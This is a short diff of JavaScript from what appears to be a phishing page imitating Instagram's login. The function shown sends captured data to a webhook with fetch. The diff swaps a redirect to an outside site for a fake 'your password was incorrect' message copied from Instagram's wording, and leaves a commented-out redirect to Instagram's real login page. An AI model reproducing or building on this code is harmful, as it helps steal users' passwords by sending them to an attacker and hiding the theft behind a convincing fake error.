@@ -81,10 +81,9 @@ async function sendInfo() {
     await fetch(webhook, config);
   } catch {
     setTimeout(function() {
-        window.location.replace("https://www.tipsproexplorer.com/cgi-bii/")
-    }, 1000);
-  }
-  setTimeout(function() {
-    window.location.replace("https://www.tipsproexplorer.com/cgi-bii/")
-  }, 1000);
-}
+    
+      // window.location.replace("https://www.instagram.com/accounts/login/")
+    console.log("Incorrect Password!");
+
+    document.getElementById("alert-message").innerHTML = "Sorry, your password was incorrect. Please double-check your password.";
+})
